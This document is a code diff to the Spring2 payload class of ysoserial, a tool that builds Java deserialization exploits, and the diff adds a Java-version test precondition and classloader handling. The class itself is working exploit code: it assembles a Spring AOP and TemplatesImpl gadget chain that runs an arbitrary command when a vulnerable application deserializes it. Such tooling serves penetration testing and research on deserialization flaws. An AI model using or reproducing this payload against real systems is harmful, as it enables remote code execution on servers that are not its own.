@@ -14,9 +14,11 @@ import org.springframework.aop.target.SingletonTargetSource;
 import ysoserial.annotation.Bind;
 import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
+import ysoserial.payloads.util.Version;
 
 
 /**
@@ -40,6 +42,7 @@ import ysoserial.payloads.util.Reflections;
     // test deps
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
 } )
+@PayloadTest( precondition = "testCheckJavaVersion" )
 public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
 	
 	@Bind private String command;
@@ -52,13 +55,16 @@ public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
 	}
 
 	public Object getObject ( ) throws Exception {
+		// Set up the classloader for dynamic class creation
+		Thread.currentThread().setContextClassLoader( this.getClass().getClassLoader() );
+		
         final Object templates = Gadgets.createTemplatesImpl(command);
 
         AdvisedSupport as = new AdvisedSupport();
         as.setTargetSource(new SingletonTargetSource(templates));
 
         final Type typeTemplatesProxy = Gadgets.createProxy(
-            (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as),
+            (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy", this.getClass().getClassLoader()).newInstance(as),
             Type.class,
             Templates.class);
 
@@ -71,6 +77,10 @@ public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
         Reflections.setFieldValue(mitp, "methodName", "newTransformer");
         return mitp;
     }
+	
+	public static Boolean testCheckJavaVersion() { 
+		return Version.allowsDefaultAIH();
+	}
 
     public static void main ( final String[] args ) throws Exception {
         PayloadRunner.run(Spring2.class, args);
